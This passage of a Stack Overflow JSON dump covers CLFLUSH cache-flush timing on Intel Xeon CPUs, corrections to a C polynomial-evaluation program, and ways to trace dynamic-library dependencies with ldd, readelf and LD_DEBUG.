"@PeterCordes, I&#39;m really sorry that the bitbucket.org by default mark a repo as private. :-( I should have check this on another machine without my account to double check. Now I have make it as public and it should work. (I double checked). (BTW, I used bitbucket because it has unlimited number of private repo.s while github will charge me for that. ;-) )"}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457624567, "post_id": 35900401, "comment_id": 59500263, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105924/discussion-between-mike-xu-and-peter-cordes\">continue this discussion in chat</a>."}, {"owner": {"reputation": 12687, "user_id": 2809095, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/705cfb2d48f12159ebae7d0275355a3f?s=128&d=identicon&r=PG&f=1", "display_name": "Iwillnotexist Idonotexist", "link": "https://stackoverflow.com/users/2809095/iwillnotexist-idonotexist"}, "edited": false, "score": 0, "creation_date": 1458361236, "post_id": 35900401, "comment_id": 59839473, "body": "@MikeXu, I&#39;ll confess that I&#39;m absolutely fascinated by your cache questions ever since I answered <a href=\"http://stackoverflow.com/questions/21265785/enable-disable-cache-on-intel-64bit-machine-cd-bit-always-set\">this one</a> more than 2 years ago. Keep them coming!"}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 12687, "user_id": 2809095, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/705cfb2d48f12159ebae7d0275355a3f?s=128&d=identicon&r=PG&f=1", "display_name": "Iwillnotexist Idonotexist", "link": "https://stackoverflow.com/users/2809095/iwillnotexist-idonotexist"}, "edited": false, "score": 1, "creation_date": 1458415083, "post_id": 35900401, "comment_id": 59854101, "body": "@IwillnotexistIdonotexist wow, how could you remember the question I asked two years ago! Amazing!"}], "answers": [{"comments": [{"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 0, "creation_date": 1457555583, "post_id": 35901312, "comment_id": 59464404, "body": "I agree that clflush will go through the execution engine and mmu, however, if we look at the Read only line in the figure, when the array goes beyong the LLC size boundary, the latency increases faster than the latency when the array is smaller. It means clflush takes more time to &quot;flush&quot; an address that&#39;s not in the cache? This is quite surprising to me..."}, {"owner": {"reputation": 17597, "user_id": 2016408, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/TVba8.jpg?s=128&g=1", "display_name": "Leeor", "link": "https://stackoverflow.com/users/2016408/leeor"}, "reply_to_user": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 1, "creation_date": 1457564033, "post_id": 35901312, "comment_id": 59468955, "body": "What CPU did you run on? could this me a cross-socket/NUMA effect? Also, please post the code (or at least a simple version)."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 0, "creation_date": 1457566200, "post_id": 35901312, "comment_id": 59469808, "body": "@MikeXu: Maybe TLB misses?  Unlikely because you probably got anon hugepages from malloc.  It does still has to translate the virtual address to physical before the cache can tell whether the address is cached.  Like I commented on the question, check perf counters.  Do you <code>clflush</code> in the order you wrote the array, or reverse order?  In reverse order, the first ~20MiB would still hit in cache."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 1, "creation_date": 1457576992, "post_id": 35901312, "comment_id": 59473209, "body": "@Leeor, I&#39;m running on Intel(R) Xeon(R) CPU E5-2618L v3 @ 2.30GHz; This machine does have NUMA arch. It has two NUMA nodes. But I&#39;m wondering how/which cross-socket/NUMA effect may cause this behavior? I&#39;m adding the simple version of the code into the question part now."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457579639, "post_id": 35901312, "comment_id": 59473930, "body": "@PeterCordes, we probably didn&#39;t flush the cache in the order we wrote the array. We wrote the array in random order but we flush the cache for the task in increasing order of the linear address in the vma of the task_struct inside kernel.  As to TLB misses, I found that Haswell processors (which my process is) has 1K L2 TLB entries, which can cover 1K * 4KB (page size) = 4MB. So if it&#39;s TLB misses, it should see the latency slope bumps at 4MB array size instead of 20MB array size. Am I right?"}], "tags": [], "owner": {"reputation": 17597, "user_id": 2016408, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/TVba8.jpg?s=128&g=1", "display_name": "Leeor", "link": "https://stackoverflow.com/users/2016408/leeor"}, "is_accepted": false, "score": 7, "last_activity_date": 1457553147, "creation_date": 1457553147, "answer_id": 35901312, "question_id": 35900401, "link": "https://stackoverflow.com/questions/35900401/how-does-clflush-work-for-an-address-that-is-not-in-cache-yet/35901312#35901312", "title": "How does CLFLUSH work for an address that is not in cache yet?", "body": "<p>You want to look at the new optimization guide for Skylake, Intel came out with another version of clflush, called clflush_opt, which is weakly ordered and would perform much better in your scenario.</p>\n\n<p>See section 7.5.7 in here - <a href=\"http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf\" rel=\"noreferrer\">http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf</a></p>\n\n<blockquote>\n  <p>In general, CLFLUSHOPT throughput is higher than  that of CLFLUSH,\n  because CLFLUSHOPT orders itself  with respect to a smaller set of\n  memory traffic as  described above and in Section 7.5.6. The\n  throughput  of CLFLUSHOPT will also vary. When  using CLFLUSHOPT,\n  flushing modified cache lines will experience a  higher cost than\n  flushing cache lines in non-modi fied states. CLFLUSHOPT  will provide\n  a performance  benefit over CLFLUSH for cache lines in any coherenc e\n  states. CLFLUSHOPT is more suitable to flush  large buffers (e.g.\n  greater than many KBytes), comp ared to CLFLUSH. In single-threaded\n  applications,  flushing buffers using CLFLUSHOPT may be up to 9X \n  better than using CLFLUSH with Skylake microarchi- tecture.</p>\n</blockquote>\n\n<p>The section also explains that flushing modified data is slower, which obviously comes from the writeback penalty.</p>\n\n<p>As for the increasing latency, are you measuring the overall time is takes to go over the address range and clflush each line? In that case you're linearly dependent on the array size, even when it passes the LLC size. Even if the lines aren't there, the clflush would have to get processed by the execution engine and memory unit, and lookup the entire cache hierarchy for each line, even if it's not present. </p>\n"}, {"comments": [{"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 0, "creation_date": 1457884725, "post_id": 35968787, "comment_id": 59598964, "body": "I confirmed from the data in the question that  clflush for RW on Xeon 2618L v3  takes 91ns to flush a cache line, which is consistent with your data. I guess the insn latency provided in the link above also measure clflush latency based on a mix of R and W requests. I guess you are right! The clflush may take more work than we thought to flush a cache line.. :-("}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "edited": false, "score": 0, "creation_date": 1457886128, "post_id": 35968787, "comment_id": 59599509, "body": "@MikeXu: Those are throughputs, <i>not</i> latencies.  To measure latency, maybe load from the cache line after clflush?  The other thing you could measure about <code>clflush</code>, which that benchmark didn&#39;t, is how much impact it has on surrounding code.  i.e. does a <code>clflush</code> every 100 <code>add</code> instructions reduce the throughput of the <code>add</code>s?  Or loads/stores instead of adds.  This is probably mostly determined by how many uops <code>clfush</code> takes.  It&#39;s probably quite a few.  Most slow operations are multi-uop.  It&#39;s pretty much only <code>divps</code> / <code>sqrtps</code> that&#39;s single-uop but not fully pipelined."}, {"owner": {"reputation": 50907, "user_id": 149138, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/cfd457233c8ebbab383475fc097442d9?s=128&d=identicon&r=PG", "display_name": "BeeOnRope", "link": "https://stackoverflow.com/users/149138/beeonrope"}, "edited": false, "score": 2, "creation_date": 1499114586, "post_id": 35968787, "comment_id": 76765255, "body": "Well apparently <code>cflush</code> and <code>cflushopt</code> <i>can</i> be nearly free (eg a few cycles or two per line), as long as the size of the flushed area is quite small. See the graph <a href=\"https://stackoverflow.com/a/44430799/149138\">this answer</a>. So the behavior is really quite weird - cheap and then skyrocketing costs after a few K. Your tests and the other tests finding &gt; 50 cycles presumably used these larger buffers, or there was some other difference such as the cache line not being present in some level of the hierarchy."}], "tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 8, "last_activity_date": 1457862458, "creation_date": 1457862458, "answer_id": 35968787, "question_id": 35900401, "link": "https://stackoverflow.com/questions/35900401/how-does-clflush-work-for-an-address-that-is-not-in-cache-yet/35968787#35968787", "title": "How does CLFLUSH work for an address that is not in cache yet?", "body": "<p>This doesn't explain the knee in the read-only graph, but does explain why it doesn't plateau.</p>\n\n<hr>\n\n<p>I didn't get around to testing locally to look into the difference between the hot and cold cache case, but I did come across a performance number for <code>clflush</code>:  </p>\n\n<p><a href=\"http://users.atw.hu/instlatx64/\" rel=\"noreferrer\">This AIDA64 instruction latency/throughput benchmark repository</a> lists a single-socket <a href=\"http://users.atw.hu/instlatx64/GenuineIntel00306F2_HaswellE2_InstLatX64.txt\" rel=\"noreferrer\">Haswell-E CPU (i7-5820K)</a> as having a <strong><code>clflush</code> throughput of one per ~99.08 cycles</strong>.  It doesn't say whether that's for the same address repeatedly, or what.</p>\n\n<p>So <code>clflush</code> isn't anywhere near free even when it doesn't have to do any work.  It's still a microcoded instruction, not heavily optimized because it's usually not a big part of the CPUs workload.</p>\n\n<p>Skylake is getting ready for that to change, with support for persistent memory connected to the memory controller:  On <a href=\"http://users.atw.hu/instlatx64/GenuineIntel00506E3_Skylake_InstLatX64.txt\" rel=\"noreferrer\">Skylake (i5-6400T)</a>, measured throughput was:</p>\n\n<ul>\n<li><code>clflush</code>: one per ~66.42cycles </li>\n<li><code>clflushopt</code>: one per ~56.33cycles</li>\n</ul>\n\n<p>Perhaps <code>clflushopt</code> is more of a win when some of the lines are actually dirty cache that needs flushing, maybe when L3 is busy from other cores doing the same thing.  Or maybe they just want to get software using the weakly-ordered version ASAP, before making even bigger improvements to throughput.  It's ~15% faster in this case, which is not bad.</p>\n"}], "owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7746, "favorite_count": 6, "answer_count": 2, "score": 15, "last_activity_date": 1515289317, "creation_date": 1457550316, "last_edit_date": 1458360112, "question_id": 35900401, "link": "https://stackoverflow.com/questions/35900401/how-does-clflush-work-for-an-address-that-is-not-in-cache-yet", "title": "How does CLFLUSH work for an address that is not in cache yet?", "body": "<p>We are trying to use the Intel CLFLUSH instruction to flush the cache content of a process in Linux at the userspace. </p>\n\n<p>We create a very simple C program that first access a large array and then call the CLFLUSH to flush the virtual address space of the whole array. We measure the latency it takes for CLFLUSH to flush the whole array. The size of the array in the program is an input and we vary the input from 1MB to 40MB with a step of 2MB.</p>\n\n<p>In our understanding, the CLFLUSH should flush the content <em>in the cache</em>. So we expect to see the latency of flushing the whole array first increase linearly in terms of the size of the array, and then the latency should stop increasing after the array size is larger than 20MB, which is the size of the LLC of our program. </p>\n\n<p>However, the experiment result is quite surprising, as shown in the figure. The latency does not stop increasing after the array size is larger than 20MB. </p>\n\n<p>We are wondering if the CLFLUSH could potentially bring in the address before CLFLUSH flushes the address out of the cache, if the address is not in the cache yet? \nWe also tried to search in the Intel software developer manual, and didn't find any explanation of what CLFLUSH will do if an address is not in the cache. </p>\n\n<p><a href=\"https://i.stack.imgur.com/tlnQB.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/tlnQB.png\" alt=\"enter image description here\"></a></p>\n\n<p>Below is the data we used to draw the figure. The first column is the size of the array in KB, and the second column is the latency of flushing the whole array in seconds.</p>\n\n<p>Any suggestion/advice is more than appreciated. </p>\n\n<p><strong>[Modified]</strong></p>\n\n<p>The previous code is unnecessary. CLFLUSH can be done in userspace much easier, although it has the similar performance. So I deleted the messy code to avoid confusion.</p>\n\n<pre><code>SCENARIO=Read Only\n1024,.00158601000000000000\n3072,.00299244000000000000\n5120,.00464945000000000000\n7168,.00630479000000000000\n9216,.00796194000000000000\n11264,.00961576000000000000\n13312,.01126760000000000000\n15360,.01300500000000000000\n17408,.01480760000000000000\n19456,.01696180000000000000\n21504,.01968410000000000000\n23552,.02300760000000000000\n25600,.02634970000000000000\n27648,.02990350000000000000\n29696,.03403090000000000000\n31744,.03749210000000000000\n33792,.04092470000000000000\n35840,.04438390000000000000\n37888,.04780050000000000000\n39936,.05163220000000000000\n\nSCENARIO=Read and Write\n1024,.00200558000000000000\n3072,.00488687000000000000\n5120,.00775943000000000000\n7168,.01064760000000000000\n9216,.01352920000000000000\n11264,.01641430000000000000\n13312,.01929260000000000000\n15360,.02217750000000000000\n17408,.02516330000000000000\n19456,.02837180000000000000\n21504,.03183180000000000000\n23552,.03509240000000000000\n25600,.03845220000000000000\n27648,.04178440000000000000\n29696,.04519920000000000000\n31744,.04858340000000000000\n33792,.05197220000000000000\n35840,.05526950000000000000\n37888,.05865630000000000000\n39936,.06202170000000000000\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1457550079, "post_id": 35900255, "comment_id": 59461107, "body": "Your evaluation routine should have one well-defined loop. Your code is overly complicated and probably also is one off as regards the order. (Unlike usual C arrays&#39; length, the order is inclusive: A quadratic polynom has order 2 and three terms.)"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1457550276, "post_id": 35900255, "comment_id": 59461240, "body": "At the time you define your array for the coefficients: <code>coefficients[order + 1]</code>, <code>order</code> isn&#39;t initialised and has an indeterminate value. Read <code>order</code> before craeting the array."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457550999, "post_id": 35900255, "comment_id": 59461698, "body": "You never fill in <code>polyExp[0]</code>. Change the <code>for</code> loop to use <code>i &gt;= 0</code> instead of <code>i &gt; 0</code>."}], "answers": [{"tags": [], "owner": {"reputation": 3107, "user_id": 3423234, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/49Nfn.gif?s=128&g=1", "display_name": "mfro", "link": "https://stackoverflow.com/users/3423234/mfro"}, "is_accepted": false, "score": 1, "last_activity_date": 1457550245, "creation_date": 1457550245, "answer_id": 35900383, "question_id": 35900255, "link": "https://stackoverflow.com/questions/35900255/evaluate-polynomial-function/35900383#35900383", "title": "Evaluate Polynomial Function", "body": "<p>Your main problem is probably the variable length array you have defined as length <code>order + 1</code> while <code>order</code> doesn't have a value assigned at that point in time.</p>\n\n<p>I'd advise to stick with fixed-length arrays for the time being (just make them long enough).</p>\n"}, {"tags": [], "owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": true, "score": 3, "last_activity_date": 1457551850, "creation_date": 1457551850, "answer_id": 35900907, "question_id": 35900255, "link": "https://stackoverflow.com/questions/35900255/evaluate-polynomial-function/35900907#35900907", "title": "Evaluate Polynomial Function", "body": "<p>Your function to evaluate the polynom is way to complicated. A mathematical representation of the polynom could look like this:</p>\n\n<pre><code>    f(x) = \u2211 c[i]\u2219x\u2071\n</code></pre>\n\n<p>There's no need to make the constant a special case, it is <code>c[0]\u2219x\u2070</code>. This formula is represented in C as:</p>\n\n<pre><code>    double polyEvaluate(double coeff[], int order, double x)\n    {\n        double res = 0.0;\n\n        for (int i = 0; i &lt;= order; i++) {\n            res += coeff[i] * pow(x, i);\n        }\n\n        return res;\n    }\n</code></pre>\n\n<p>This simple code requires that the index of the coefficient refers to the exponent, which is a more natural representation for the evaluation function. If you want the user to enter the coefficients with the large exponents first, this should in my opinion be handled once during the input. </p>\n\n<p>(You reverse of the auxiliary array <code>polyExp</code>, but that's not really needed; it would be enough to access the coefficient with <code>order - i</code> when you sum the terms. Still, it is better to choose a representation that represents your code well in code. With your current code, you create an auxiliary array and reverse it for <em>every</em> evaluation.)</p>\n\n<p>You can evaluate the polynom without the <code>pow</code> function and hence without the math library, just calculate the power of <code>x</code> as you go:</p>\n\n<pre><code>    double polyEvaluate(double coeff[], int order, double x)\n    {\n        double fact = 1.0;\n        double res = 0.0;\n        int i;\n\n        for (i = 0; i &lt;= order; i++) {\n            res += coeff[i] * fact;\n            fact *= x;\n        }\n\n        return res;\n    }\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 5819793, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/954985944548727/picture?type=large", "display_name": "Perry Chapman", "link": "https://stackoverflow.com/users/5819793/perry-chapman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2035, "favorite_count": 0, "accepted_answer_id": 35900907, "answer_count": 2, "score": 0, "last_activity_date": 1457551850, "creation_date": 1457549807, "last_edit_date": 1457550831, "question_id": 35900255, "link": "https://stackoverflow.com/questions/35900255/evaluate-polynomial-function", "title": "Evaluate Polynomial Function", "body": "<p>Not sure where I'm going wrong in this, and it has to be in my polyEvaluate function, but any help would be appreciated. The problem is coming in the final calculation. I've tried modifying the function but that doesn't seem to fix the issue.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\ndouble polyEvaluate(double coefficients[], int order, double x)\n{\n    int i, j;\n    double polyExp[order], polyProd[order];\n    double sum;\n    double constant = coefficients[order];\n    double temp;\n\n    for(i=order-1; i&gt;0; i--){\n        polyExp[i]=pow(x, i);\n    }\n\n    j=order;\n    i=0;\n\n    while (i&lt;j){\n        temp=polyExp[i];\n        polyExp[i]=polyExp[j];\n        polyExp[j]=temp;\n        i++;\n        j--;\n    }\n\n    for(i=0; i&lt;order; i++){\n        polyProd[i]=coefficients[i] * polyExp[i];\n    }\n\n    for(i=0; i&lt;order; i++) {\n        sum+=polyProd[i];\n    }\n\n    sum+=constant;\n\n    return(sum);\n}\n\nint main(void)\n{\n    int order, i;\n    double input;\n    double coefficients[order+1];\n\n    printf(\"Enter the order of the polynomial: \");\n    scanf(\"%d\", &amp;order);\n\n    printf(\"\\nEnter the coefficients: \\n\");\n\n    for(i=0; i&lt;=order; i++)\n    {\n        printf(\" &gt;&gt; \");\n        scanf(\"%lf\", &amp;coefficients[i]);\n    }\n\n    printf(\"\\nEnter the value of x: \");\n    scanf(\"%lf\", &amp;input);\n\n    printf(\"\\nThe value of the function is: %lf\", polyEvaluate(coefficients, order, input));\n\n    return(0);\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "linux", "dynamic-library", "ldd"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1457549843, "post_id": 35900227, "comment_id": 59460966, "body": "<code>ltrace</code> will show all of the dynamic library calls during runtime."}], "answers": [{"tags": [], "owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "is_accepted": true, "score": 1, "last_activity_date": 1457550236, "creation_date": 1457550236, "answer_id": 35900381, "question_id": 35900227, "link": "https://stackoverflow.com/questions/35900227/is-it-possible-to-know-which-library-pulled-in-another-one-using-ldd/35900381#35900381", "title": "Is it possible to know which library pulled in another one using ldd?", "body": "<p>To know this you will have to use <code>readelf</code> recursively. First run it on your executable, and look for NEEDED libraries. This will tell you what your executable needs directly. After that you should iteratively repeat the process for every library which is needed, and once you arrive at the library in question you will know the inclusion path.</p>\n"}, {"tags": [], "owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "is_accepted": false, "score": 1, "last_activity_date": 1457550774, "creation_date": 1457550774, "answer_id": 35900568, "question_id": 35900227, "link": "https://stackoverflow.com/questions/35900227/is-it-possible-to-know-which-library-pulled-in-another-one-using-ldd/35900568#35900568", "title": "Is it possible to know which library pulled in another one using ldd?", "body": "<p>Run ldd on each of the libraries reported by <code>ldd executable</code>. Continue recursively until the culprit is found.</p>\n\n<p>Alternatively, run </p>\n\n<pre><code>objdump -p /path/to/program-or-library | grep NEEDED\n</code></pre>\n\n<p>recursively.</p>\n"}, {"tags": [], "owner": {"reputation": 438, "user_id": 6023696, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b57a85cdf9fda1595e219bd07a412e8?s=128&d=identicon&r=PG", "display_name": "coolparadox", "link": "https://stackoverflow.com/users/6023696/coolparadox"}, "is_accepted": false, "score": 5, "last_activity_date": 1457567531, "creation_date": 1457567531, "answer_id": 35905007, "question_id": 35900227, "link": "https://stackoverflow.com/questions/35900227/is-it-possible-to-know-which-library-pulled-in-another-one-using-ldd/35905007#35905007", "title": "Is it possible to know which library pulled in another one using ldd?", "body": "<p><code>ldd</code> is ultimately a wrapper script for executing the dynamic linker/loader with variable <code>LD_TRACE_LOADED_OBJECTS</code> set in environment. For example the following command outputs the same as <code>ldd /bin/ls</code> in my system:</p>\n\n<pre><code>user@localhost ~ $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.* /bin/ls\n    linux-gate.so.1 (0xb77bd000)\n    libacl.so.1 =&gt; /lib/libacl.so.1 (0xb7798000)\n    libc.so.6 =&gt; /lib/libc.so.6 (0xb75ef000)\n    libattr.so.1 =&gt; /lib/libattr.so.1 (0xb75e9000)\n    /lib/ld-linux.so.2 (0x80065000)\n</code></pre>\n\n<p>There is a plethora of other environment variables for tuning the dynamic linker documented in <code>ld.so(8)</code> manpage. One of particular interest for discovering the reason a specific library was pulled is <code>LD_DEBUG=files</code>, that traces what files the linker goes after during processing of the executable:</p>\n\n<pre><code>user@localhost ~ $ LD_TRACE_LOADED_OBJECTS=1 LD_DEBUG=files /lib/ld-linux.so.* /bin/ls\n     27831: file=/bin/ls [0];  generating link map\n     27831:   dynamic: 0x08064f0c  base: 0x00000000   size: 0x0001e034\n     27831:     entry: 0x0804bffc  phdr: 0x08048034  phnum:         10\n     27831: \n     27831: \n     27831: file=libacl.so.1 [0];  needed by /bin/ls [0]\n     27831: file=libacl.so.1 [0];  generating link map\n     27831:   dynamic: 0xb772ced8  base: 0xb7724000   size: 0x0000917c\n     27831:     entry: 0xb77257f0  phdr: 0xb7724034  phnum:          7\n     27831: \n     27831: \n     27831: file=libc.so.6 [0];  needed by /bin/ls [0]\n     27831: file=libc.so.6 [0];  generating link map\n     27831:   dynamic: 0xb771fda4  base: 0xb757b000   size: 0x001a8eac\n     27831:     entry: 0xb75937b0  phdr: 0xb757b034  phnum:         11\n     27831: \n     27831: \n     27831: file=libattr.so.1 [0];  needed by /lib/libacl.so.1 [0]\n     27831: file=libattr.so.1 [0];  generating link map\n     27831:   dynamic: 0xb7579ef0  base: 0xb7575000   size: 0x000050bc\n     27831:     entry: 0xb7575ed0  phdr: 0xb7575034  phnum:          7\n     27831: \n    linux-gate.so.1 (0xb7749000)\n    libacl.so.1 =&gt; /lib/libacl.so.1 (0xb7724000)\n    libc.so.6 =&gt; /lib/libc.so.6 (0xb757b000)\n    libattr.so.1 =&gt; /lib/libattr.so.1 (0xb7575000)\n    /lib/ld-linux.so.2 (0x80094000)\n</code></pre>\n\n<p>In the above example, we see that <code>libacl.so.1</code> and <code>libc.so.6</code> were required by <code>/bin/ls</code> itself, and <code>libattr.so.1</code> was pulled as a requirement of <code>libacl.so.1</code>.</p>\n"}], "owner": {"reputation": 3913, "user_id": 342384, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/MRRvI.jpg?s=128&g=1", "display_name": "iksemyonov", "link": "https://stackoverflow.com/users/342384/iksemyonov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 959, "favorite_count": 0, "accepted_answer_id": 35900381, "answer_count": 3, "score": 2, "last_activity_date": 1457567531, "creation_date": 1457549690, "last_edit_date": 1457550038, "question_id": 35900227, "link": "https://stackoverflow.com/questions/35900227/is-it-possible-to-know-which-library-pulled-in-another-one-using-ldd", "title": "Is it possible to know which library pulled in another one using ldd?", "body": "<p>Once an application has been linked with the dynamic libraries it requires, is it possible to find out which exact library has pulled in another one that I'm seeing in the list?</p>\n\n<p>For example, today I had a situation where a library that shouldn't have been there at all in the first place was present in the <code>ldd</code> output, and was crashing the application. By logical deduction, I could figure it out and isolate the problem, then rebuild the respective project to not include the faulty lib anymore. But is it possible to do the same without any additional knowledge about the application and the libraries it depends on, using an exterrnal tool from the likes of <code>ldd</code>? (The problem was that the library in question wasn't being used directly by the application, rather by another library that the application was linking to directly.)</p>\n\n<p>In essence, it looks like I'm searching for a way to restore the linking dependency graph once the application has been linked together.</p>\n"}, {"tags": ["c++", "c", "solaris", "shared-memory"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457549646, "post_id": 35900144, "comment_id": 59460826, "body": "At first you said the segment has &quot;read-only mode for him only&quot;, then you said &quot;when I have read rights on a segment&quot;. Which is it?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457549747, "post_id": 35900144, "comment_id": 59460900, "body": "Have you tried looking at the source code of 